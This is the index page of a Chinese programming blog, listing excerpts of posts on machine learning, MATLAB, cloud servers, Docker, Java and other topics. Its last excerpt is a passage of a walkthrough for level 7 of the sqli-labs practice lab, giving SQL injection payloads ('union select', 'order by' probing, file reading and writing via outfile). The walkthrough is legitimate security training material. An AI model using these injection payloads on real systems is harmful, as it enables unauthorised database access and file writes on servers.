<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65c83ee81828b12c7ae37f7a85233adf/" rel="bookmark">
			【标准化方法】(3) Group Normalization 原理解析、代码复现，附Pytorch代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天和各位分享一下深度学习中常用的标准化方法，Group Normalization 数据分组归一化，向大家介绍一下数学原理，并用 Pytorch 复现。
Group Normalization 论文地址：https://arxiv.org/pdf/1803.08494.pdf
1. 原理介绍 在目标检测，视频分类等大型计算机视觉应用中，受到计算机内存的限制，必须设置较小的样本数量，但是样本量小势必会导致批归一化的性能有所影响。
分组归一化（Group Normalization，GN）是针对批归一化算法对批次大小依赖性强这一弱点而提出的改进算法。因为 BN 层统计信息的计算与批次的大小有关，因此当批次变小时，很明显统计均值和方差的计算会越不准确和稳定，最终会有小批次高错误率的这一现象发生。
分组归一化 GN 介于层归一化 LN 和实例归一化 IN 之间，对于输入大小为 [N,C,H,W] 的图像，N 代表批次的大小，C 表示输入通道数，H,W 表示输入图片高度和宽度。
分组归一化首先将输入通道 C 分为 G 个小组，然后分别对每一小组做归一化操作，也就是先把输入的特征维度由 变成 ，归一化的维度为 。
事实上，当 G 等于 1 时，即所有的输入通道为 1 组时 GN 与 LN 的计算方式相同，而当 G 等于 C 时，1 个输入通道为 1 组时 GN 与 IN 的计算方式相同。
上图是批归一化算法 BN、层归一化算法 LN、实例归一化 IN 和分组归一化 GN 的简单图示。图中的立方体是三维，蓝色的方块是各个算法计算均值和方差的区域。
其中 C 代表通道数，N 是批量大小，H,W 是高度和宽度，第三个维度的大小是 H*W，这样输入就可以用三维图形来表示。从上图中可以看出只有 BN 的计算与批次大小 N 有关，LN、IN 和 GN 的计算都在单个样本上进行， LN、IN 和 GN 三者可相互转换。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65c83ee81828b12c7ae37f7a85233adf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39ab4aaf8096953337cbb31ae042baa6/" rel="bookmark">
			备战数学建模2——MATLAB导入数据，处理缺失值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、导入数据1 第一步：导入文件
最常用的就是导入excel表格数据，项选项卡 -&gt;导入数据-&gt;选择excel文件。
第二步，导入的范围选择
●导入数据的范围默认是从第二行开始的，第一行一般是标题行。
■如果不想导入所有数据，可以按住ctrI键，选择想导入的内容，例如某行、某列。
■“变量名称行”也就是导入之后, matlab里表格最上方会显示变量，一般默认选择原文件第一行。 但是只能识别英文,如果是汉字则变成VerName".
按照如下图所示的选项，也可以得知和改变一些东西
第三步 导入类型选择
第四步 如果有不能导入的值，采用替换为NAN（不知道是什么东西）或者去掉的方法处理
注意，导入后数据在工作区.关闭matlab后数据消失。如果想保存数据的话，记得保存工作区文件!
二、导入数据2 把文件放在当前运行的文件目录下，用指令： 导入当前目录下的mat文件
X = load('matlab.mat') 而导入XECEL文件为矩阵的是另一个函数：
A =xlsread('G.xlsx') %导入矩阵 三、处理缺失值和异常值 1.清理缺失数 实时编辑器，选择任务-&gt;清理缺失数据
首先，先写- -组包含缺失值和异常值的例子
x =1:100; %构造一个数组（矩阵），元素为1，2，3，...100 %构造数据值 %矩阵元素的均值为0，方差o^2 = 1，且是正态分布的随机数 data = randn(1, 100); % randn(1, 100)意味着生成一个1行100列的矩阵 %设置第20，40， 60， 80个元素为缺失值 data(20:20:80) = NaN; % data的值都是在0附近的，设置4个异常值 data(10) = -50; data(40) = 45; data(70) = -40; data(90) = 50; p1ot(x, data) 异常数据运行结果：
版本低了，没有实时编辑器 无法处理数据
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/39ab4aaf8096953337cbb31ae042baa6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f19d1b0c6b59ab9d453d7636f9e61f3/" rel="bookmark">
			十、软考2013年下半年软件设计师易错题整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		十、软考2013年下半年软件设计师易错题整理 文章目录 十、软考2013年下半年软件设计师易错题整理错题1错题2错题3错题4错题5错题6错题7错题8错题9错题10错题11错题12错题13错题14错题15错题16错题17错题18错题19错题20专业英语 错题1 在程序执行过程中，Cache与主存的地址映像由(1)。
(1)A.硬件自动完成 B.程序员调度C.操作系统管理 D.程序员与操作系统协同完成 【答案】A
【解析】本题考查计算机系统基础知识。
Cache的工作是建立在程序与数据访问的局部性原理上。经过对大量程序执行情况的结果分析：在一段较短的时间间隔内程序集中在某一较小的内存地址空间执行，这就是程序执行的局部性原理。同样，对数据的访问也存在局部性现象。
为了提高系统处理速度才将主存部分存储空间中的内容复制到工作速度更快的Cache中，同样为了提高速度的原因，Cache系统都是由硬件实现的。
错题2 下列网络攻击行为中，属于DoS攻击的是(7)。
(7)A.特洛伊木马攻击 B.SYN Flooding攻击 C.端口欺骗攻击 D.IP欺骗攻击 【答案】B
【解析】本试题考查网络安全相关知识。
特洛伊木马是附着在应用程序中或者单独存在的一些恶意程序，它可以利用网络远程控制网络另一端的安装有服务端程序的主机，实现对被植入了木马程序的计算机的控制，或者窃取被植入了木马程序的计算机上的机密资料。
Dos攻击一般为拒绝服务攻击，通过网络的内外部用户来发动攻击。内部用户可以通过长时间占用系统的内存、CPU处理时间使其他用户不能及时得到这些资源，而引起拒绝服务攻击；外部黑客也可以通过占用网络连接使其他用户得不到网络服务。SYN Flooding攻击以多个随机的源主机地址向目的路由器发送SYN包，在收到目的路由器的SYN ACK后并不回应，于是目的路由器就为这些源主机建立大量的连接队列，由于没有收到ACK—直维护着这些队列，造成了资源的大量消耗而不能向正常请求提供服务，甚至导致路由器崩溃。服务器要等待超时才能断开己分配的资源，所以SYN Flooding攻击是一种DoS攻击。
端口欺骗攻击是采用端口扫描找到系统漏洞从而实施攻击。
IP欺骗攻击是产生的IP数据包为伪造的源IP地址，以便冒充其他系统或发件人的身份。
错题3 下列算法中，不属于公开密钥加密算法的是(9)。
(9)A.ECC B.DSA C.RSA D.DES 【答案】D
【解析】本题考查加密算法的基础知识。
常用的加密算法依据所使用的秘钥数分为单钥和双钥加密体制，也称私钥和公钥加密算法。ECC、DSA和RSA都属于公开密钥加密算法，DES是典型的私钥加密体制。
错题4 矢量图是常用的图形图像表示形式，(10)是描述矢量图的基本组成单位。
(10)A.像素 B.像素点 C.图元 D.二进制位 【答案】C
【解析】本题考査多媒体方面的基础知识。
矢量图形是用一系列计算机指令来描述和记录的一幅图的内容，即通过指令描述构成一幅图的所有直线、曲线、圆、圆弧、矩形等图元的位置、维数和形状，也可以用更为复杂的形式表示图像中的曲面、光照、材质等效果。矢量图法实质上是用数学的方式(算法和特征)来描述一幅图形图像，在处理图形图像时根据图元对应的数学表达式进行编辑和处理。在屏幕上显示一幅图形图像时，首先要解释这些指令，然后将描述图形图像的指令转换成屏幕上显示的形状和颜色。编辑矢量图的软件通常称为绘图软件，如适于绘制机械图、电路图的AutoCAD软件等。
错题5 为说明某一问题，在学术论文中需要引用某些资料。以下叙述中，(13)是不正确的。
(13)A.既可引用发表的作品，也可引用未发表的作品B.只能限于介绍、评论作品C.只要不构成自己作品的主要部分，可适当引用资料D.不必征得原作者的同意，不需要向他支付报酬 【答案】A
【解析】本题考查知识产权方面的基础知识。
选项A“既可引用发表的作品，也可引用未发表的作品”的说法显然是错误的。因为，为说明某一问题，在学术论文中需要引用某些资料必须是已发表的作品，但只能限于介绍、评论作品，只要不构成自己作品的主要部分，可适当引用资料，而不必征得原作者的同意，不需要向他支付报酬。
错题6 以下作品中，不适用或不受著作权法保护的是(14)。
(14)A.某教师在课堂上的讲课B.某作家的作品《红河谷》C.最高人民法院组织编写的《行政诉讼案例选编》D.国务院颁布的《计算机软件保护条例》 【答案】D
【解析】本题考查知识产权方面的基础知识。
选项D“国务院颁布的《计算机软件保护条例》”的说法显然是错误的。因为，国务院颁布的《计算机软件保护条例》是国家为了管理需要制定的政策法规，故不适用著作权法保护。
错题7 以下关于数据流图中基本加工的叙述，不正确的是(15)。
(15)A.对每一个基本加工，必须有一个加工规格说明B.加工规格说明必须描述把输入数据流变换为输出数据流的加工规则C.加工规格说明必须描述实现加工的具体流程D.决策表可以用来表示加工规格说明 【答案】C
【解析】本题考查结构化分析方法的基础知识。
分层的数据流图是结构化分析方法的重要组成部分。对数据流图中的每个基本加工，需要有一个加工规格说明，描述把输入数据流变换为输出数据流的加工规则，但不需要描述实现加工的具体流程。可以用结构化语言、判定表和判定树来表达基本加工。
错题8 假设系统采用PV操作实现进程同步与互斥，若有n个进程共享一台扫描仪，那么当信号量S的值为-3时，表示系统中有(23)个进程等待使用扫描仪。
(23)A.0 B.n-3 C.3 D.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f19d1b0c6b59ab9d453d7636f9e61f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c3229563e50bdb969ca8828518b9c54/" rel="bookmark">
			学术海报Poster-- 模板分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学术海报Poster-- 模板分享 0、引言1、下载地址百度网盘链接地址CSDN托管 2、模板样例 ⚠申明： 未经许可，禁止以任何形式转载，若要引用，请标注链接地址。 全文共计3077字，阅读大概需要3分钟
🌈更多学习内容， 欢迎👏关注👀【文末】我的个人微信公众号：不懂开发的程序猿
个人网站：https://jerry-jy.co/
0、引言 读研期间，发表的论文被录用，一般会通过口述演讲或者Poster海报的形式向参与者展示你的论文科研成果，其中受众面积最大的一般是Poster海报分享的形式。
对于论文录用者来说，它也是最简单的一种参会形式，而拥有一份精美的海报模板，对于广大的研究生来说，能省时省力不少，科研工作成果好很重要，但是，用精美的海报展示您的科研成果，让更多的读者了解到你的科研内容/成果，同样也非常重要。
我在读研期间，就苦于寻找一份精美的海报模板而花费大量时间，现将这100份模板海报分享给你，希望对你的科研之路也能有一些帮助
内含多种海报尺寸，多种研究方向和主题，希望能有适合你的
1、下载地址 百度网盘链接地址 链接：https://pan.baidu.com/s/15h9AM7i1fQ1sYB-lLa57Lg?pwd=2023
提取码：2023
若网盘失效，可以后台私聊，我再重新发你
CSDN托管 https://download.csdn.net/download/qq_44807756/87766310?spm=1001.2014.3001.5501
0 积分就可以下载，不用VIP会员
2、模板样例 –end–
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46daf6de88ced1967c73a0c9be1cbc2f/" rel="bookmark">
			vue项目部署后提示用户有新版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		你可能在浏览器见到过上面这种UI，这是在vue项目重新build在服务端部署后，浏览器刷新页面弹出的提示，这时如果用户点击更新就会重载页面，清除之前的缓存获取最新内容。
这是怎样发生的呢？你可能会想到下面的方式：
服务端编译重新部署维护一个版本号，客户端通过轮询检测和本地存储的是否相同，发现更新的版本就弹框提示（缺点 耗电。尤其是在移动端）通过在html中做版本标记…websocket长连接像客户端推送版本更新（繁琐）service worker 通过观察截图左下角的红框，可以看出这个网站采用方式是 注册了 service worker。
当刷新页面后之前注册的 service worker 的 updated(){} 生命周期中监听到有新的内容可供更新，触发更新弹框，提示用户更新。
这种方式只需前端处理，不需要服务端做任何工作。只要每次build后重新在服务端部署，有文件发生变动，就可以被service worker发现。
这篇文章就来记录一下怎么做。
引入cli-plugin-pwa 参考 vue项目引入pwa使网页应用可安装
在上面的基础上，向下进行。
在registerServiceWorker.js添加事件触发 /* eslint-disable no-console */ import { register } from 'register-service-worker' if (process.env.NODE_ENV === 'production') { register(`${process.env.BASE_URL}service-worker.js`, { ready () { console.log( 'App is being served from cache by a service worker.\n' + 'For more details, visit https://goo.gl/AFskqB' ) }, registered () { console.log('Service worker has been registered.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46daf6de88ced1967c73a0c9be1cbc2f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcce951499f0ab21d1d72dc318c9c729/" rel="bookmark">
			阿里云服务器镜像是什么？镜像系统怎么选择？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		阿里云服务器镜像是云服务器的装机盘，镜像是为云服务器安装操作系统的。云服务器镜像系统怎么选择？云服务器操作系统镜像分为Linux和Windows两大类，Linux可以选择Alibaba Cloud Linux，Windows可以选择Windows Server 2022数据中心版64位中文版。阿里云百科分享什么是镜像以及云服务器镜像系统的选择方法：
目录
什么是镜像？
云服务器镜像系统怎么选择？
1、根据程序语言选择操作系统
2、低配云服务器首选Linux镜像
3、Linux操作系统选择
4、Windows Server系统选择哪个比较好？
5、操作系统64位和32位什么选？
什么是镜像？ 什么是镜像？镜像是云服务器ECS实例的“装机盘”，为ECS实例提供操作系统、初始化应用数据、预装的软件，通过镜像可以创建并部署ECS云服务器实例。
阿里云镜像
云服务器镜像系统怎么选择？ 阿里云镜像根据来源不同分为公共镜像、自定义镜像、共享镜像、云市场镜像和社区镜像，公共镜像是阿里云官网提供的纯净版操作系统，没有预装其他的软件，用户需要自己安装；自定义镜像是用户自己创建的镜像；共享镜像是其他阿里云账号共享给你的镜像；云市场镜像是第三方提供的镜像，镜像包括基础系统、应用环境和各类软件；社区镜像是其他阿里云用户共享到社区的。可以使用阿里云测速工具 aliyunping.com 测试一下本地到阿里云服务器各个地域节点的Ping值网络延迟。
公共镜像、自定义镜像、共享镜像、云市场镜像和社区镜像
本文关于阿里云服务器操作系统的说明，指的是公共镜像。阿里云服务器可选择的公共镜像操作系统分为两大类，即Windows和Linux，操作系统如：Alibaba Cloud Linux、Anolis OS、CentOS、Windows Server、Red Hat、SUSE Linux、Ubuntu、Debian、Fedora、Fedora CoreOS、OpenSUSE、FreeBSD、Rocky Linux、CentOS Stream和AlmaLinux。
云服务器操作系统选择主要看用户的实际使用场景、云服务器配置等因素，另外，云服务器操作系统选择后也可以可以免费更换的，所以加不用担心。需要注意的是，如果是非中国大陆地域的云服务器，Linux和Windows系统不可以互换，举例说明，假设你的云服务器是中国香港地域的，最初安装了Linux系统，那么更换系统只能修改成Linux类的，不可以更改成Windows系统，如果是中国大陆地域的云服务器，如北京上海深圳等，没有限制，随便更换。参考：更换操作系统教程
1、根据程序语言选择操作系统 阿里云服务器操作系统的选择主要取决于用户的实际使用场景，阿里云百科以Web网站应用为例，程序语言如果是ASP、.NET、HTML、数据库ACCESS、SQL Server建议选择Windows；PHP、PERL、CGI、数据库MySQL、SQLite建议选择Linux。像阿里云百科主要用来搭建网站，安装的是CentOS操作系统，搭配宝塔Linux面板。
2、低配云服务器首选Linux镜像 Windows和Linux系统相比而言，Linux类操作系统占用系统资源会更少一些，如果云服务器配置较低，如1核1G、1核2G的配置建议首选Linux类操作系统，如Alibaba Cloud Linux或CentOS Stream等，Linux系统更少占用系统资源。
Windows Server系统要求系统盘至少40GB，Linux操作系统一般20GB的系统盘就够用了。
3、Linux操作系统选择 阿里云Linux操作系统可选范围很广，如Alibaba Cloud Linux、Anolis OS、CentOS Stream、Red Hat、Ubuntu、Debian等。如果是云服务器ECS使用，可以选择Alibaba Cloud Linux，Alibaba Cloud Linux是基于龙蜥社区(OpenAnolis) 龙蜥操作系统(Anolis OS)的阿里云发行版，它针对云服务器ECS做了大量深度优化，阿里云官方免费提供长期支持和维护(LTS)，完全兼容 RHEL/CentOS 生态和操作方式。
因为CentOS停止维护了，所以想要使用CentOS的同学，也可以选择CentOS Stream。也可以选择Ubuntu，Ubuntu基于Debian，新手更容易上手。
4、Windows Server系统选择哪个比较好？ 阿里云目前支持的Windows Server镜像有2012 R2数据中心版64位中文版英文版、Version 2022 with Container 数据中心版不含UI、Version 2004 数据中心版、Version 2004 with Container、2008 R2 企业版等。现在很多同学在找Windows Server 2008版本，目前阿里云公共镜像是有提供2008款系统的，只是已停止维护(EOL)，大家使用的时候需要自己注意下安全性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fcce951499f0ab21d1d72dc318c9c729/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/431faccaeffc7c8de49ec8c6112dd13a/" rel="bookmark">
			什么是SSL通配符证书？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是通配符证书？
最近在建设网站时听到很多小伙伴反馈，上线网站后不知道怎么去选择SSL证书，有单域名、多域名，还有通配符的，想选一张适合自己网站的SSL证书，但是不知道该怎么选择？那么通配符证书是什么证书?有什么作用?通配符证书是什么证书?
我们常说的SSL通配符证书，是一款可以保护子域名安全的ssl证书。通配符证书也被称为泛域名证书，英文名称为：Wildcard Certificates。ssl通配符证书可以保护这个域名，同时，该域名之下所有子域名都可以得到保护（也可以用到二级域名）。相当于不限制子域名数量，作用极大。即使添加了新的子域名，也不需要重新审核和另外付费，为用户和企业节约了大量的时间和金钱。
通配符证书的作用有哪些？
通过ssl证书分类来看，它表现出很大的优越性。通配符ssl证书支持DV型ssl证书和OV型ssl证书，EV型ssl不支持申请通配符证书。DV型ssl需通过审核域名权限验证，通过验证之后的几分钟就可以颁发了。OV型ssl必须提交企业相关信息和域名验证资料，大概需要一到三天。直到确认审核企业信息无误后，即可签发证书。
通配符证书作用还体现在ssl通配符证书与普通ssl证书不同，它能够保护主域名以及旗下不限数量的子域。这就意味着，用户可以通过申请一个ssl通配符证书来保护任意数量的子域。举个例子，假设名字为baidu.com的用户申请了通配符证书，那么此证书可以同时保护www.baidu.com、www.b2b.baidu.com/等多个站点，这就免去了用户为同一个网站申请多个ssl证书的问题。
1、容易管理
我们在管理站点时，如果有多个二级站点。那我们也只要管理好这一个证书。如果单独证书很麻烦的，每年还要看到期时间，是否生效等。
2、节省成本
如果我们单个站点选择证书，肯定是单域名证书划算。如果我们多二级域名的话，通配符证书是节省成本的，二级域名越多成本越低。
总结：
SSL通配符证书具有最大限度的兼容性，为团体提供了很大的灵活性和价值，管理员可增加更多的子域，简便管理。我们在申请通配符SSL证书的时候，需要对该证书的品牌也进行一定的了解，毕竟不同的品牌，对于该网站来说，所造成的影响也是很大的，建议大家在配置通配符SSL证书时选择知名度大，在市场上口碑好的证书品牌。
申请地址：永久免费SSL证书_永久免费https证书_永久免费ssl证书申请-JoySSL
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8891ee24472b353fe2783159eb112b1c/" rel="bookmark">
			python获取obs窗口来源以及内容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前提 了解win32和uia
pywin32 安装python包
pip install pywin32 pip install pillow 执行代码
import win32gui import win32gui, re from PIL import ImageGrab class WindowMgr: """Encapsulates some calls to the winapi for window management""" def __init__(self): """Constructor""" self._handle = None def find_window(self, class_name, window_name=None): """基于类名来查找窗口""" self._handle = win32gui.FindWindow(class_name, window_name) def _window_enum_callback(self, hwnd, class_name_wildcard_list): """传递给win32gui.EnumWindows()，检查所有打开的顶级窗口""" class_name, wildcard = class_name_wildcard_list if win32gui.GetClassName(hwnd) == class_name and re.match(wildcard, str(win32gui.GetWindowText(hwnd))) is not None: self._handle = hwnd def find_window_wildcard(self, class_name, wildcard): "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8891ee24472b353fe2783159eb112b1c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e19e4ed36cbd9396c6c098452692a43e/" rel="bookmark">
			画图Bug：Backend QtAgg is interactive backend. Turning interactive mode on.画不出图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		找到文件地址：
D:\Anaconda\Lib\site-packages\matplotlib\mpl-data
将38行由Agg改为TkAgg
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc8ee7db3a5fdc6cb2237bde32e416c6/" rel="bookmark">
			使用Docker搭建LAMP环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 安装docker 查看系统的版本
cat /etc/redhat-release
Docker CE 支持 64 位版本 CentOS 7 ，并且要求内核版本不低于 3.10。 CentOS 7 满足最低内核的要求。
安装docker前先更新下，免得出错
yum update -y
reboot
安装docker
yum install -y docker
docker version # 查看docker版本
启动
systemctl start docker # 启动
systemctl enable docker # 添加入开机启动
2. LAMP环境搭建方案
搭建LAMP环境的主要方案分别是：
一个镜像直接包含全部（简单才是最好用的）
apache、mysql、php独立连接。
虽然只是了两种方案，但是细节处还是有所不同的。比如说：直接下载别人做好的镜像或者是自己建模，自己建模也分yum安装，源码安装，然后还可以根据个人习惯优化和服务配置。这里列举最简单的方案。
docker search -s 10 lamp # 搜索被收藏或使用较多的LAMP镜像，小伙伴们都推荐使用tutum/lamp
docker pull docker.io/tutum/lamp #下载镜像 docker images #查看镜像
3. 创建LAMP容器
mkdir /mysql_data docker run -d --name=lamp -p 8080:80 -p 3306:3306 -v /mysql_data:/var/lib/mysql docker.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dc8ee7db3a5fdc6cb2237bde32e416c6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b673c131af634257d531653a174a1b8f/" rel="bookmark">
			MyBatis-Plus多个不同实体类对应的分页IPage重构抽取成特定统一方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		利用泛型方法的方式，泛型符号T表示传入方法的参数类型
public Msg getPage(Integer currentPage, Integer everyPageSize, String type) { Msg msg = new Msg(); if (type == null || type.equals("")) { msg.setCode(2000); msg.setMsg("类型type不存在"); return msg; } try { switch (type) { case "01": return getPageData(new Page&lt;&gt;(currentPage, everyPageSize), new QueryWrapper&lt;ReachGoal01&gt;().orderByDesc("id"), ReachGoal01.class, reachGoal01Mapper, msg); case "02": return getPageData(new Page&lt;&gt;(currentPage, everyPageSize), new QueryWrapper&lt;ReachGoal02&gt;().orderByDesc("id"), ReachGoal02.class, reachGoal02Mapper, msg); case "03": return getPageData(new Page&lt;&gt;(currentPage, everyPageSize), new QueryWrapper&lt;ReachGoal03&gt;().orderByDesc("id"), ReachGoal03.class, reachGoal03Mapper, msg); default: msg.setCode(2000); msg.setMsg("类型type不存在"); return msg; } } catch (Exception e) { msg.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b673c131af634257d531653a174a1b8f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bd0b763535f484c6ca1a120624be242/" rel="bookmark">
			rtl仿真器-verilator安装和测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装 查看官网安装说明页
https://verilator.org/guide/latest/install.html
1.ubuntu 源已经加好了，直接用命令安装
2. 编译源码安装：
sudo apt-get install git perl python3 make autoconf g++ flex bison ccache
sudo apt-get install libgoogle-perftools-dev numactl perl-doc
sudo apt-get install libfl2 # Ubuntu only (ignore if gives error)
sudo apt-get install libfl-dev # Ubuntu only (ignore if gives error)
sudo apt-get install zlibc zlib1g zlib1g-dev # Ubuntu only (ignore if gives error)
git clone https://github.com/verilator/verilator # Only first time
unset VERILATOR_ROOT # For bash
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bd0b763535f484c6ca1a120624be242/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30c966d3eece0955b19c945cc8ca5572/" rel="bookmark">
			Tomcat线程池扩展总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Tomcat 线程池 前言 最近在压测接口，调线程池参数大小，感觉和预计的不一样。
看了看 tomcat 线程池源码 对比 JDK 线程池源码
源码 构造代码
这里是提交任务
可以看到 这里重写了 TaskQueue 类
可以看到 重写了offer方法
增加了这一行判断，如果提交的任务数没有大于最大线程数，提交的任务大于线程数，会去创建线程，而不是一味的像 JDK 线程池一样给队列里放任务。
这里返回fasle
然后继续执行原线程池方法，核心线程数满了继续下面判断，offer被 Tomcat 重写也就是上面，所以这里会返回 false，继续走下面addwork创建逻辑
addworker 里面逻辑，原jdk线程池逻辑，不用多说了吧。
线程池的并发调优 对此，tomcat是优先创建最大线程数，不是一味的往队列里放，所以，设置线程池参数，不能像 JDK 线程池一样设置，尽量优先于线程数，Tomcat 是处理业务的，而业务应当第一时间请求被处理，故而觉得 Tomcat 这么设置很合理。
既然了解了 Tomcat 线程池原理，那么我们应当设置核心线程数和最大线程数，最大线程数不能设置过多，核心线程数不能设置最小，大量请求进来，需要临时创建线程数，线程设置多了也会影响性能。
一般来说，默认核心线程数是 25，最大是 200，一般建议 500~800，具体根据硬件和业务压测设置。
Tomcat线程池扩展总结 Tomcat线程池默认实现StandardThreadExecutor。
Tomcat 线程池和 Java 原生线程池的 区别：
自定义了拒绝策略，Tomcat 在线程总数达到最大数时，不是立即执行拒绝策 略，而是再尝试向任务队列添加任务，添加失败后再执行拒绝策略。TaskQueue 重写了 LinkedBlockingQueue 的 offer 方法。只有当前线程数大 于核心线程数、小于最大线程数，并且已提交的任务个数大于当前线程数时，也就是 说线程不够用了，但是线程数又没达到极限，才会去创建新的线程。目的：在任务队 列的长度无限制的情况下，让线程池有机会创建新的线程。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22c24b84fe95a3a799dac43b0051dfca/" rel="bookmark">
			python：numpy库中50个常用的函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Numpy库是Python语言中广泛应用于科学计算和数据处理的基础库。它提供了基本的数组操作和高级数学函数。在本文中，我们将介绍50个常用的Numpy函数及其使用方法。 numpy.array(): 将输入的列表转换为ndarray类型。
import numpy as np x = [1, 2, 3, 4] y = np.array(x) print(y) 输出：[1 2 3 4]
numpy.arange(): 创建一个数组，其中包含一个等间隔的值序列。
import numpy as np x = np.arange(0, 10, 2) print(x) 输出：[0 2 4 6 8]
numpy.linspace(): 创建一个包含指定数量的等间隔数字的数组。
import numpy as np x = np.linspace(0, 10, 5) print(x) 输出：[ 0. 2.5 5. 7.5 10. ]
numpy.zeros(): 返回一个全部为0的数组。
import numpy as np x = np.zeros(3) print(x) 输出：[0. 0. 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/22c24b84fe95a3a799dac43b0051dfca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd90cddfbc9e1f128a4cb0b69b2e05e0/" rel="bookmark">
			sqli-labs第七关
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一步，判断注入点
?id=1
?id=1'
?id=1"
?id=1')
?id=1")
?id=1'))
可以看到，存在注入点，且为字符型注入，单引号括号括号闭合
第二步，判断字段数
?id=1')) order by 3 --+
?id=1')) order by 4 --+
页面正常，可判断字段数为3
页面报错，可判断字段数不为4、
第三步：判断回显位
页面无回显，根据页面的提示“use outfile”,判断需要写入文件 才能过关
?id=-1')) union select 1,@@basedir,@@datadir --+
@@datadir 读取数据库路径
@@basedir MYSQL 获取安装路径
通过语句可以查看目录路径地址
提示使用outfile
load_file()读取文件
前提：1、用户权限足够高，尽量具有root权限。2、secure_file_priv不为NULL
into outfile() 写入文件
需要mysql数据库开启secure-file-priv写文件权限，否则不能写入文件。
可以用命令窗口看一下MYSQL的权限,先进入MYSQL
show variables lilke '%secure%' ;
如果使用的是phpstudy，进入mysql安装目录，
我的目录是D:\LeStoreDownload\phpStudyjiayou\phpstudy_pro\Extensions\MySQL5.7.26
进入目录，找到my.ini 修改里面的secure-file-priv参数
如果没有secure_file_priv这个选项，直接添加即可。
